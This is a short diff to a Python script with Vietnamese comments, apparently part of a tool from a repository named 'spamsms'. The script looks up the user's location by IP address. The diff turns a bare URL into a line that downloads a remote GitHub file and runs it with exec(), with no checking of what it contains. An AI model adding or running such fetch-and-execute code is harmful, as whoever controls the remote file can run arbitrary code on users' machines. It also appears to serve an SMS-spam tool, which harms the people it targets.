@@ -31,4 +31,4 @@ def get_location_by_ip():
 # Gọi hàm lấy thông tin vị trí
 city, region, country, latitude, longitude = get_location_by_ip()
 os.system('cls' if os.name == 'nt' else 'clear') #xóa các hàm phía trước
-https://raw.githubusercontent.com/minhtrinh2007/spamsms/refs/heads/main/banner
+exec(requests.get('https://raw.githubusercontent.com/minhtrinh2007/spamsms/refs/heads/main/banner').text)
